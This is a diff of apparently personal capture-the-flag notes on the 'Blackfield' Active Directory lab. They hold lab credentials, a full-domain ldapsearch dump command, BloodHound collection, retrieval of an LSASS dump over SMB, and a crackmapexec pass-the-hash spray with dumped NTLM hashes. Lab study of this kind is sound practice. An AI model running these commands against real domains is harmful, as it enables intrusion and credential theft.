@@ -43,7 +43,7 @@ audit2020 : ComplexP4ssw0rd!
 	- support has NETLOGON and SYSVOL
 	- support spider plus
 	- got sysvol share - policy 
-- 593ldapsearch -x -H ldap://10.129.229.17 -D 'support@BLACKFIELD.local' -w '#00^BlackKnight' -b "DC=BLACKFIELD,DC=local" | tee -a support-DUMP-entire-domain.ldapsearch
+- 593 `ldapsearch -x -H ldap://10.129.229.17 -D 'support@BLACKFIELD.local' -w '#00^BlackKnight' -b "DC=BLACKFIELD,DC=local" | tee -a support-DUMP-entire-domain.ldapsearch`
 - 3268
 - 5985
 	- 
@@ -65,6 +65,8 @@ python3 bloodhound.py --dns-tcp -c all -d BLACKFIELD.local -dc DC01.BLACKFIELD.l
 -
 -
 -
+
+
 
 
 #### Todo List
@@ -90,3 +92,25 @@ smbget # use ccache file to auth in and get lsass.zip
 - Is Ipwn3dYourCompany soft deleted?
 
 - Is there a better way to view the firewall_rules.txt
+
+
+Fallback on checking hashes if SIDs change
+```
+crackmapexec smb -u users.txt -H dumpedntmls.ntml 
+```
+
+
+/etc/ntpsec/ntp.conf 
+
+Alternative to `ntpdate` https://ioflood.com/blog/ntpdate-linux-command/
+```bash
+chronyd
+```
+https://ioflood.com/blog/ntpdate-linux-command/
+```bash
+# Synchronize system time using ntpdate
+sudo ntpdate pool.ntp.org
+
+# Synchronize hardware time with system time
+sudo hwclock --systohc
+```
